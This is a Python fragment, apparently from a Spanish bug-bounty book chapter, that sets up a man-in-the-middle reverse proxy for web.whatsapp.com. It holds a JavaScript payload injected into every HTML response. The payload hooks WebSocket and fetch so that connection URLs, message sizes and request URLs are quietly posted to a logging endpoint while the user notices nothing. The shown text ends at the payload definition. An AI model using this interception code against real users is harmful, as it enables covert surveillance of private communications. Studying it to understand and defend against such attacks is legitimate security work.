# Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
"""
whatsapp_mitm_proxy.py -- Proxy inverso transparente
WhatsApp funciona con normalidad; el usuario no nota nada.
El proxy inyecta JS en las respuestas HTML y registra WebSocket.
"""
import http.server, ssl, urllib.request, json
from datetime import datetime, timezone
from pathlib import Path

PORT = 8443
TARGET = "https://web.whatsapp.com"
LOG_FILE = Path("mitm_intercept.log")

# JavaScript inyectado en cada respuesta HTML
INJECT_JS = """<script>
(function() {
    // Hook WebSocket para interceptar trafico Signal
    var OrigWS = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        fetch('/mitm_log', {method:'POST', body:JSON.stringify({
            type:'ws_connect', url:url,
            time:new Date().toISOString()
        })}).catch(function(){});

        var ws = new OrigWS(url, protocols);
        var origSend = ws.send.bind(ws);

        // Interceptar envios
        ws.send = function(data) {
            fetch('/mitm_log', {method:'POST', body:JSON.stringify({
                type:'ws_send',
                size: data.length || data.byteLength
            })}).catch(function(){});
            return origSend(data);
        };

        // Interceptar recepciones
        ws.addEventListener('message', function(e) {
            fetch('/mitm_log', {method:'POST', body:JSON.stringify({
                type:'ws_recv',
                size: e.data.length || e.data.byteLength
            })}).catch(function(){});
        });

        return ws;
    };
    window.WebSocket.prototype = OrigWS.prototype;

    // Hook fetch para interceptar peticiones HTTP
    var origFetch = window.fetch;
    window.fetch = function(url, opts) {
        var u = String(url);
        if (!u.includes('mitm_log')) {
            fetch('/mitm_log', {method:'POST', body:JSON.stringify({
                type:'fetch', url:u,
                method:(opts||{}).method||'GET'
            })}).catch(function(){});
        }
        return origFetch.apply(this, arguments);
    };
})();
</script>"""
